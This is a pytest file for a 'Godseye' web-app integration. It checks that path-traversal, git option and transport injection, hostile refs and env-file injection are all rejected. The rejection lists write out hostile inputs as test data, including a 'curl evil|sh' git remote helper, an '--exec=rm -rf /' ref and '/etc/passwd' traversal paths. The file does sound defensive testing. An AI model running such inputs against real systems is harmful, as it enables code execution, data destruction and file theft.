"""Godseye integration — pure logic (no orchestrator, no Redis, no FastAPI).

Mirrors tests/test_integrations_policy.py: exercises vera.godseye.godseye_core
directly. Two things here are load-bearing enough to be explicit matrices:

  * ``resolve_asset`` is the guard on a directory Vera serves to the browser.
    A hole there hands out arbitrary files from the host.
  * ``is_safe_repo_url``/``is_safe_ref`` feed straight into ``git`` argv. `git
    clone` treats ``ext::sh -c …`` as a remote helper — i.e. remote code
    execution by URL — and a leading ``-`` turns any argument into an option.
"""
import json
from pathlib import Path

import pytest

from vera.godseye import godseye_core as C


# ── resolve_asset: the static-serving path guard ─────────────────────────────
@pytest.fixture()
def dist(tmp_path):
    d = tmp_path / "dist"
    (d / "assets").mkdir(parents=True)
    (d / "index.html").write_text("<html>", encoding="utf-8")
    (d / "assets" / "index-abc123.js").write_text("//js", encoding="utf-8")
    (tmp_path / "secret.txt").write_text("do not serve me", encoding="utf-8")
    return d


def test_serves_a_real_file(dist):
    assert C.resolve_asset(dist, "assets/index-abc123.js") == dist / "assets" / "index-abc123.js"


def test_empty_path_is_the_index(dist):
    assert C.resolve_asset(dist, "") == dist / "index.html"
    assert C.resolve_asset(dist, "/") == dist / "index.html"


@pytest.mark.parametrize("rel", [
    "../secret.txt",
    "assets/../../secret.txt",
    "assets/../../../etc/passwd",
    "..%2fsecret.txt/..",
    "/etc/passwd",
    "//etc/passwd",
    "assets/./../../secret.txt",
])
def test_traversal_never_escapes_dist(dist, rel):
    assert C.resolve_asset(dist, rel) is None


def test_missing_file_and_directory_are_not_assets(dist):
    assert C.resolve_asset(dist, "nope.js") is None
    assert C.resolve_asset(dist, "assets") is None          # a directory is not a file


def test_nul_byte_is_rejected(dist):
    assert C.resolve_asset(dist, "index\x00.html") is None


def test_symlink_out_of_dist_is_rejected(dist, tmp_path):
    link = dist / "escape.txt"
    try:
        link.symlink_to(tmp_path / "secret.txt")
    except (OSError, NotImplementedError):
        pytest.skip("symlinks not permitted on this filesystem")
    assert C.resolve_asset(dist, "escape.txt") is None


# ── the "never dirty Vera's tree" guard ──────────────────────────────────────
IGNORE_FILE = "# comment\n\n.vera-work/\n/vendor/\nlogs/\n"


@pytest.mark.parametrize("rel", ["vendor", "vendor/godseye", "vendor/godseye/dist"])
def test_gitignore_fallback_covers_the_dir_and_its_children(rel):
    assert C.gitignore_covers(rel, IGNORE_FILE) is True


@pytest.mark.parametrize("rel,text", [
    ("vendored/godseye", IGNORE_FILE),        # near-miss name
    ("vendor/godseye", "# nothing here\n"),   # no rule at all
    ("vendor/godseye", "vend*/\n"),           # globs are not interpreted -> fail closed
    ("vendor/godseye", "#/vendor/\n"),        # commented-out rule
    ("", IGNORE_FILE),                        # no path -> never "covered"
    # An ignore rule cancelled by a re-include: git would TRACK this again, so
    # answering "covered" would be exactly the mistake the guard exists to stop.
    ("vendor/godseye", "/vendor/\n!vendor/godseye/\n"),
    ("vendor/godseye/dist", "/vendor/\n!/vendor/\n"),
])
def test_gitignore_fallback_fails_closed_when_unsure(rel, text):
    assert C.gitignore_covers(rel, text) is False


def test_cache_control_never_pins_the_html_entrypoint():
    assert C.cache_control_for("index.html") == "no-store"
    assert C.cache_control_for("/godseye/app/index.html") == "no-store"


def test_only_content_hashed_assets_are_immutable():
    # Vite renames these on every build, so pinning them is safe...
    assert "immutable" in C.cache_control_for("assets/index-abc123.js")
    assert "immutable" in C.cache_control_for("/godseye/app/assets/x-9f8e7d.css")
    # ...but Cesium keeps its filenames across versions. Pinning THOSE for a
    # year serves a stale runtime to everyone who loaded the previous build.
    for p in ("cesium/Workers/w.js", "cesium/Cesium.js",
              "manifests/cctv-verified.json", "data/osmMilitarySites.json"):
        cc = C.cache_control_for(p)
        assert "immutable" not in cc and "max-age=3600" in cc


def test_cache_control_judges_the_requested_name_not_the_sidecar():
    # The .gz is an encoding of the same resource; it must not change the policy.
    assert C.cache_control_for("assets/index-abc.js.gz") == \
        C.cache_control_for("assets/index-abc.js")
    assert C.cache_control_for("index.html.gz") == "no-store"


# ── precompressed asset negotiation ──────────────────────────────────────────
@pytest.fixture()
def gz_pair(tmp_path):
    plain = tmp_path / "Cesium.js"
    plain.write_text("x" * 500, encoding="utf-8")
    (tmp_path / "Cesium.js.gz").write_bytes(b"\x1f\x8b fake")
    return plain


def test_gzip_is_served_only_when_the_client_asks(gz_pair):
    assert C.negotiate_encoding(gz_pair, "gzip") == (
        Path(str(gz_pair) + ".gz"), "gzip")
    assert C.negotiate_encoding(gz_pair, "gzip, deflate, br") [1] == "gzip"
    assert C.negotiate_encoding(gz_pair, "gzip;q=1.0, *;q=0.5")[1] == "gzip"
    # Case is not significant in a header.
    assert C.negotiate_encoding(gz_pair, "GZIP")[1] == "gzip"


def test_a_client_that_did_not_offer_gzip_gets_the_original(gz_pair):
    for accept in ("", "identity", "br", "deflate", "*"):
        send, enc = C.negotiate_encoding(gz_pair, accept)
        assert (send, enc) == (gz_pair, ""), accept
    # "br" must not match on a substring of some other token either.
    assert C.negotiate_encoding(gz_pair, "x-gzipped")[1] == ""


def test_missing_sidecar_falls_back_to_the_plain_file(tmp_path):
    plain = tmp_path / "only.js"
    plain.write_text("hello", encoding="utf-8")
    assert C.negotiate_encoding(plain, "gzip") == (plain, "")


# ── build log state machine ──────────────────────────────────────────────────
def test_absent_log_is_not_a_finished_build():
    s = C.parse_build_log("")
    assert s == {"started": False, "finished": False, "running": False, "ok": False,
                 "exit_code": None, "stage": "", "lines": 0, "tail": []}


def test_a_log_without_the_exit_marker_is_still_running():
    s = C.parse_build_log("[godseye] build started\n[godseye] --- npm ci ---\nnpm warn x\n")
    assert s["running"] is True and s["finished"] is False and s["ok"] is False
    assert s["stage"] == "npm ci"


def test_exit_zero_is_the_only_success():
    s = C.parse_build_log("[godseye] --- vite build (base=/godseye/app/) ---\nGODSEYE_EXIT=0\n")
    assert (s["finished"], s["ok"], s["exit_code"]) == (True, True, 0)
    assert s["stage"].startswith("vite build")

    f = C.parse_build_log("[godseye] --- npm ci ---\nGODSEYE_EXIT=1 (npm ci failed)\n")
    assert (f["finished"], f["ok"], f["exit_code"]) == (True, False, 1)


def test_tail_is_bounded():
    s = C.parse_build_log("\n".join(str(i) for i in range(200)), tail=5)
    assert s["tail"] == ["195", "196", "197", "198", "199"] and s["lines"] == 200


# ── git argv safety ──────────────────────────────────────────────────────────
@pytest.mark.parametrize("url", [
    "https://github.com/VrushankPatel/godseye",
    "http://gitea.int/mirror/godseye",
])
def test_plain_http_urls_are_accepted(url):
    assert C.is_safe_repo_url(url) is True


@pytest.mark.parametrize("url", [
    "",
    "--upload-pack=touch /tmp/pwned",
    "-u https://x/y",
    "ext::sh -c 'curl evil|sh'",
    "git@github.com:VrushankPatel/godseye.git",
    "ssh://git@host/repo",
    "file:///etc",
    "https://host/repo with space",
])
def test_option_and_transport_injection_are_refused(url):
    assert C.is_safe_repo_url(url) is False


def test_only_the_pinned_upstream_may_be_vendored():
    # Vera builds and serves whatever this clones as same-origin JavaScript, and
    # runs its npm lifecycle scripts — so a capability ARGUMENT must not be able
    # to choose the repo.
    ok, _ = C.allowed_repo_url(C.UPSTREAM_URL, {})
    assert ok is True
    assert C.allowed_repo_url(C.UPSTREAM_URL + ".git", {})[0] is True
    assert C.allowed_repo_url(C.UPSTREAM_URL + "/", {})[0] is True

    bad, why = C.allowed_repo_url("https://evil.example/payload", {})
    assert bad is False and C.UPSTREAM_URL in why      # the refusal names the pin
    assert C.allowed_repo_url("https://github.com/someone/godseye", {})[0] is False
    # A near-miss host must not pass.
    assert C.allowed_repo_url("https://github.com.evil/VrushankPatel/godseye", {})[0] is False


def test_an_operator_may_point_at_a_mirror_through_the_environment():
    env = {"VERA_GODSEYE_REPO_URL": "https://gitea.int/mirrors/godseye"}
    assert C.allowed_repo_url("https://gitea.int/mirrors/godseye", env)[0] is True
    assert C.allowed_repo_url(C.UPSTREAM_URL, env)[0] is True     # upstream still fine
    assert C.allowed_repo_url("https://evil.example/x", env)[0] is False
    # An env override still has to be a sane URL.
    assert C.allowed_repo_url("ext::sh -c evil",
                              {"VERA_GODSEYE_REPO_URL": "ext::sh -c evil"})[0] is False


@pytest.mark.parametrize("ref", ["main", "v1.0.0", "release/2026-08", "a1b2c3d4"])
def test_ordinary_refs_are_accepted(ref):
    assert C.is_safe_ref(ref) is True


@pytest.mark.parametrize("ref", [
    "", "--exec=rm -rf /", "-b", "a b", "refs/../../etc", "feature..main",
    "branch/", "x.lock", "a" * 200,
])
def test_hostile_refs_are_refused(ref):
    assert C.is_safe_ref(ref) is False


def test_sync_argv_runs_git_in_a_container_not_on_the_host(tmp_path):
    # The host's ~/.gitconfig carries
    # url."git@github.com:".insteadOf=https://github.com/, which rewrote the
    # pinned HTTPS url to SSH and failed the clone of a PUBLIC repo with
    # "Permission denied (publickey)". A container has no such config to inherit.
    argv = C.docker_sync_argv(vendor_dir=tmp_path / "vendor",
                              script_path=tmp_path / "sync.sh",
                              clone_name="godseye", url="https://h/r",
                              ref="main", depth=1, uid=1000, gid=1000)
    assert argv[0] == "docker" and "git" not in argv[:2]
    # Attached + --rm: a shallow clone finishes in seconds, and nothing is left
    # behind to name-clash with the next run.
    assert "--rm" in argv and "-d" not in argv and "--name" not in argv
    mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "-v"]
    assert f"{tmp_path / 'vendor'}:/work" in mounts
    assert f"{tmp_path / 'sync.sh'}:/opt/godseye_sync.sh:ro" in mounts
    env = dict(argv[i + 1].split("=", 1) for i, a in enumerate(argv) if a == "-e")
    assert env["GODSEYE_URL"] == "https://h/r" and env["GODSEYE_REF"] == "main"
    assert env["GODSEYE_SRC"] == "/work/godseye"
    # Root inside (installing git needs it); the script hands the tree back to
    # the host user so the UNPRIVILEGED build can write node_modules/dist.
    assert "--user" not in argv
    assert (env["GODSEYE_UID"], env["GODSEYE_GID"]) == ("1000", "1000")
    assert argv[-3:] == [C.DEFAULT_NODE_IMAGE, "sh", "/opt/godseye_sync.sh"]


def test_sync_argv_depth_and_ref_are_optional(tmp_path):
    argv = C.docker_sync_argv(vendor_dir=tmp_path, script_path=tmp_path / "s.sh",
                              clone_name="godseye", url="https://h/r", depth=0)
    env = dict(argv[i + 1].split("=", 1) for i, a in enumerate(argv) if a == "-e")
    assert env["GODSEYE_DEPTH"] == "0"        # 0 = full clone, the script skips --depth
    assert env["GODSEYE_REF"] == ""


def test_sync_script_contract():
    """The git sequence now lives in shell, so guard it where it is."""
    raw = (Path(__file__).resolve().parent.parent
           / "vera" / "godseye" / "godseye_sync.sh").read_text(encoding="utf-8")
    # Assert about the COMMANDS, not the prose — the comments discuss `git pull`
    # precisely to explain why it is not used.
    script = "\n".join(ln for ln in raw.splitlines()
                       if not ln.lstrip().startswith("#"))
    # fetch + hard checkout, never a merge that could wedge a managed clone.
    assert "git fetch" in script and "checkout --force --detach" in script
    assert "git pull" not in script
    # `--` before the url: a url that slipped the filter cannot become a flag.
    assert '-- "$URL" "$SRC"' in script
    # Never block on a credential prompt.
    assert "GIT_TERMINAL_PROMPT=0" in script
    # The build runs unprivileged and must be able to write into the clone.
    assert 'chown -R "$UID_:$GID_"' in script
    # ...which then makes git refuse the host-owned repo on the SECOND run
    # ("detected dubious ownership"), so the update path must declare it safe.
    assert "safe.directory" in script


def test_build_script_precompresses_the_bundle():
    """Nothing compresses these at request time, so the build must."""
    raw = (Path(__file__).resolve().parent.parent
           / "vera" / "godseye" / "godseye_build.sh").read_text(encoding="utf-8")
    script = "\n".join(ln for ln in raw.splitlines()
                       if not ln.lstrip().startswith("#"))
    assert "gzip -9 -k" in script
    # -k keeps the original: the sidecar is an ADDITION, and a client that does
    # not send Accept-Encoding: gzip still has to get a file to read.
    for suffix in ("'*.js'", "'*.css'", "'*.json'"):
        assert suffix in script
    # Never compress a compressed file into a second layer.
    assert "! -name '*.gz'" in script


# ── describing the clone without host git ────────────────────────────────────
def test_repo_meta_prefers_what_the_sync_container_recorded(tmp_path):
    state, clone = tmp_path / ".godseye", tmp_path / "godseye"
    state.mkdir()
    (state / "repo.json").write_text(json.dumps({
        "sha": "a" * 40, "short": "aaaaaaa", "subject": "Add globe",
        "committed_at": "2026-08-29T00:00:00Z", "action": "cloned"}), encoding="utf-8")
    meta = C.read_repo_meta(state, clone)
    assert meta["short"] == "aaaaaaa" and meta["subject"] == "Add globe"


def test_repo_meta_falls_back_to_git_head_for_a_hand_made_clone(tmp_path):
    state, clone = tmp_path / ".godseye", tmp_path / "godseye"
    git = clone / ".git"
    git.mkdir(parents=True)
    (git / "HEAD").write_text("b" * 40 + "\n", encoding="utf-8")     # detached
    assert C.read_repo_meta(state, clone)["sha"] == "b" * 40

    (git / "HEAD").write_text("ref: refs/heads/master\n", encoding="utf-8")
    (git / "refs" / "heads").mkdir(parents=True)
    (git / "refs" / "heads" / "master").write_text("c" * 40 + "\n", encoding="utf-8")
    assert C.read_repo_meta(state, clone)["short"] == "c" * 7

    # A fresh clone keeps its refs packed rather than loose.
    (git / "refs" / "heads" / "master").unlink()
    (git / "packed-refs").write_text(
        "# pack-refs with: peeled\n" + "d" * 40 + " refs/heads/master\n", encoding="utf-8")
    assert C.read_repo_meta(state, clone)["sha"] == "d" * 40


def test_repo_meta_is_empty_when_there_is_nothing_to_describe(tmp_path):
    assert C.read_repo_meta(tmp_path / "none", tmp_path / "none") == {}
    # Corrupt metadata must not be trusted, and must not raise either.
    state = tmp_path / ".godseye"
    state.mkdir()
    (state / "repo.json").write_text("{not json", encoding="utf-8")
    assert C.read_repo_meta(state, tmp_path / "nope") == {}


# ── BYOK config ──────────────────────────────────────────────────────────────
def test_only_known_keys_survive():
    cfg = C.known_config({"VITE_YOUTUBE_API_KEY": "abc", "SHELL": "/bin/sh",
                          "VITE_MADE_UP": "x"})
    assert cfg == {"VITE_YOUTUBE_API_KEY": "abc"}


def test_env_file_cannot_be_made_to_hold_a_second_assignment():
    text = C.env_file_text({
        "VITE_YOUTUBE_API_KEY": "k1\nVITE_GUARDIAN_API_KEY=stolen",
        "VITE_MAPBOX_ACCESS_TOKEN": "",          # empty -> omitted entirely
        "NOT_A_GODSEYE_KEY": "nope",
    })
    assignments = [ln for ln in text.splitlines() if ln and not ln.startswith("#")]
    assert len(assignments) == 1
    assert assignments[0].startswith("VITE_YOUTUBE_API_KEY=")
    assert "NOT_A_GODSEYE_KEY" not in text
    assert "VITE_MAPBOX_ACCESS_TOKEN" not in text
    # The injected text survives only INSIDE the one quoted value; it never
    # becomes an assignment of its own, which is the property that matters.
    assert not any(ln.startswith("VITE_GUARDIAN_API_KEY=") for ln in assignments)


def test_control_characters_are_stripped_not_quoted_away():
    assert C.clean_env_value(" ab\ncd\t ") == "abcd"
    assert C.clean_env_value("") == "" and C.clean_env_value(None) == ""


def test_redaction_never_returns_a_whole_key():
    value = "placeholder-not-a-real-key"
    red = C.redact_config({"VITE_GOOGLE_MAPS_3D_KEY": value})
    assert value not in red["VITE_GOOGLE_MAPS_3D_KEY"]
    assert red["VITE_GOOGLE_MAPS_3D_KEY"].startswith("pla")
    assert C.redact_config({"VITE_YOUTUBE_API_KEY": "short"})["VITE_YOUTUBE_API_KEY"] == "*****"
    assert C.redact_config({})["VITE_YOUTUBE_API_KEY"] == ""


# ── layout + docker argv ─────────────────────────────────────────────────────
def test_default_layout_lives_under_an_ignored_vendor_dir(tmp_path):
    lay = C.resolve_layout(tmp_path, {})
    assert lay["clone_dir"] == tmp_path / "vendor" / "godseye"
    assert lay["dist_dir"] == lay["clone_dir"] / "dist"
    # Build state sits BESIDE the clone, never inside it: writing into the clone
    # would dirty Godseye's own git tree and break `godseye.repo.sync`.
    assert lay["state_dir"] == tmp_path / "vendor" / ".godseye"
    assert lay["log_path"].parent == lay["state_dir"]
    assert lay["clone_dir"] not in lay["state_dir"].parents


def test_env_override_relocates_everything(tmp_path):
    lay = C.resolve_layout(tmp_path, {"VERA_GODSEYE_DIR": str(tmp_path / "elsewhere" / "gs")})
    assert lay["clone_dir"] == tmp_path / "elsewhere" / "gs"
    assert lay["state_dir"] == tmp_path / "elsewhere" / ".godseye"


def test_relative_override_is_anchored_to_the_repo(tmp_path):
    lay = C.resolve_layout(tmp_path, {"VERA_GODSEYE_DIR": "opt/gs"})
    assert lay["clone_dir"] == tmp_path / "opt" / "gs"


def test_docker_argv_runs_as_the_host_user_and_wires_both_mounts(tmp_path):
    argv = C.docker_build_argv(vendor_dir=tmp_path / "vendor",
                               script_path=tmp_path / "build.sh",
                               clone_name="godseye", uid=1000, gid=1000)
    assert argv[:3] == ["docker", "run", "-d"]
    # Root-owned node_modules/dist locked the next build out of its own log.
    assert "--user" in argv and argv[argv.index("--user") + 1] == "1000:1000"
    mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "-v"]
    assert f"{tmp_path / 'vendor'}:/work" in mounts
    assert f"{tmp_path / 'build.sh'}:/opt/godseye_build.sh:ro" in mounts
    env = dict(argv[i + 1].split("=", 1) for i, a in enumerate(argv) if a == "-e")
    assert env["GODSEYE_BASE"] == C.APP_BASE      # must match how Vera serves it
    assert env["GODSEYE_SRC"] == "/work/godseye"
    assert (env["GODSEYE_REFRESH"], env["GODSEYE_CLEAN_INSTALL"]) == ("0", "0")
    assert argv[-3:] == [C.DEFAULT_NODE_IMAGE, "sh", "/opt/godseye_build.sh"]


def test_docker_argv_flags_are_opt_in(tmp_path):
    argv = C.docker_build_argv(vendor_dir=tmp_path, script_path=tmp_path / "b.sh",
                               clone_name="godseye", refresh_manifests=True,
                               clean_install=True)
    env = dict(argv[i + 1].split("=", 1) for i, a in enumerate(argv) if a == "-e")
    assert (env["GODSEYE_REFRESH"], env["GODSEYE_CLEAN_INSTALL"]) == ("1", "1")


def test_app_base_and_mount_agree():
    # index.html's asset URLs are built from APP_BASE; the route serves APP_MOUNT.
    # If these drift, every hashed asset 404s.
    assert C.APP_BASE == C.APP_MOUNT + "/"


def test_summarize_dist_needs_an_index(tmp_path):
    d = tmp_path / "dist"
    (d / "assets").mkdir(parents=True)
    js = d / "assets" / "a.js"
    js.write_text("x" * 10, encoding="utf-8")
    # Files but no index.html -> a broken/partial build, not "built".
    assert C.summarize_dist([js], d)["built"] is False
    (d / "index.html").write_text("<html>", encoding="utf-8")
    s = C.summarize_dist([js, d / "index.html"], d)
    assert s["built"] is True and s["files"] == 2 and s["bytes"] == 16
    assert C.summarize_dist([], d)["built"] is False


def test_repo_root_is_the_dir_above_vera(tmp_path):
    # vera/godseye/godseye_core.py -> repo root. Getting this wrong silently
    # relocates the whole vendor tree.
    mod = tmp_path / "vera" / "godseye" / "godseye_core.py"
    mod.parent.mkdir(parents=True)
    mod.write_text("", encoding="utf-8")
    assert C.repo_root(str(mod)) == tmp_path.resolve()
